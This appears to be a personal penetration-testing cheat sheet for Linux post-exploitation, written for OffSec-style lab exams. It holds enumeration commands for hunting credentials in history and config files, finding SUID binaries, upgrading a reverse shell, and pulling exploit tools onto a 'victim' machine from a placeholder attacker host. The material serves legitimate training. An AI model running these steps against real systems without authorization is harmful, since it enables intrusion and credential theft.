**Purpose:**

Fast reference for commands you repeatedly need **after initial access** on Linux.

---

## Terminal Navigation

### Moving Around Directories

```bash
pwd
```
→ Shows your current absolute path in the filesystem. Essential for orientation after gaining shell access on an unknown system.

```bash
ls
```
→ Lists all non-hidden files and directories in the current location. Use this to quickly survey what's in a folder.

```bash
ls -la
```
→ Lists all files including hidden ones (dotfiles), with permissions, ownership, and timestamps. The `-a` flag reveals hidden files that a plain `ls` would miss.

```bash
cd /path/to/folder
```
→ Changes your working directory using the full path from root. Use absolute paths when you need to navigate regardless of where you currently are.

```bash
cd foldername
```
→ Changes into a subdirectory relative to your current location. Faster than typing the full path when you're already in the right parent directory.

```bash
cd ..
```
→ Moves up one level in the directory tree. Chain it (e.g. `cd ../../`) to climb several levels at once.

```bash
cd ~
```
→ Takes you directly to the current user's home directory. Useful as a quick reset point after navigating deep into the filesystem.

```bash
cd -
```
→ Returns you to the last directory you were in. Handy for rapidly toggling between two working locations.

---

### Absolute vs Relative Paths

| Type | Example | Meaning |
|------|---------|---------|
| Absolute | `/home/prudence/notes` | Full path from root — works from anywhere |
| Relative | `notes` or `./notes` | Path from your current location |

---

### Useful Shortcuts

| Shortcut | What it does |
|----------|--------------|
| `Tab` | Autocomplete file/folder names — use this constantly |
| `Tab Tab` | Show all possible completions when there are multiple |
| `Ctrl+C` | Kill the current running command |
| `Ctrl+Z` | Suspend (background) the current process |
| `Ctrl+L` | Clear the terminal screen (same as `clear`) |
| `Up arrow` | Cycle through previous commands |
| `Ctrl+R` | Search command history — type part of a previous command |

---

### Reading Files

```bash
cat filename
```
→ Outputs the full contents of a file to the terminal at once. Best for small files; use `less` if the file is long.

```bash
less filename
```
→ Opens a file in a scrollable viewer that doesn't flood your terminal. Press `/` to search within the file and `q` to exit.

---

## Who Am I

```bash
whoami
```
→ Displays the username of the current process. Quick sanity check after gaining a shell to confirm what account you're running as.

```bash
id
```
→ Shows the user's UID, GID, and all group memberships in detail. Key groups like `sudo`, `docker`, `lxd`, and `disk` can each be a direct path to root.

```bash
uname -a
```
→ Prints full kernel and OS details including version, architecture, and hostname. Use the kernel version to research known CVEs for local privilege escalation.

```bash
cat /etc/os-release
```
→ Reveals the Linux distribution name and version. Helps narrow down which exploits, package managers, or file paths apply to this system.

```bash
cat /etc/passwd
```
→ Lists all local user accounts with their home directories and default shells. Look for non-standard users or service accounts that may have interesting permissions.

---

## Sudo

```bash
sudo -l
```
→ **Always run first.** Lists the commands the current user is allowed to run with elevated privileges without a password. A misconfigured sudo entry is one of the most common privesc vectors.

---

## Processes

```bash
ps aux
```
→ Shows every process running on the system with its owner, PID, and full command line. Use this to spot interesting services, credentials passed as arguments, or processes running as root.

```bash
ps aux | grep root
```
→ Filters the process list to show only root-owned processes. Focus here for processes that might be exploitable or injectable to escalate privileges.

---

## Network

```bash
ss -tlnp
```
→ Lists all TCP ports currently listening on the machine along with the process owning each one. Helps identify internal services not exposed externally that may be vulnerable.

```bash
ip a
```
→ Displays all network interfaces and their assigned IP addresses. Use this to identify the machine's subnets and find potential pivot targets.

---

## File System

```bash
find /home -name "local.txt" 2>/dev/null
```
→ Recursively searches all home directories for the OffSec user flag file. The `2>/dev/null` suppresses permission error noise to keep output clean.

```bash
find / -name "*.conf" -o -name "*.bak" 2>/dev/null
```
→ Searches the entire filesystem for configuration and backup files. These often contain plaintext credentials, API keys, or database connection strings.

```bash
find / -perm -4000 -type f 2>/dev/null
```
→ Finds every binary on the system with the SUID bit set. SUID binaries run as their owner (often root) regardless of who executes them — check each one on GTFOBins.

```bash
cat ~/.bash_history
```
→ Reads the command history for the current user's shell session. Admins sometimes type passwords directly into commands, leaving them exposed here.

---

## Shell Upgrade (After Reverse Shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
→ Spawns a fully interactive bash shell using Python's pty module. Upgrades a limited reverse shell into a proper TTY so tools like `sudo` and tab completion work correctly.

---

## File Transfer

```bash
# Kali — host a file:
python3 -m http.server 80

# Victim — download:
wget http://<KALI_IP>/file
curl http://<KALI_IP>/file -o file
```
→ Sets up a temporary HTTP server on Kali to serve files over port 80. The victim machine pulls the file down using `wget` or `curl` — useful for transferring exploit scripts or tools.

---

## Related Notes

- [[Linux_Priv_Esc]]
- [[Netcat]]
- [[File_Transfer]]
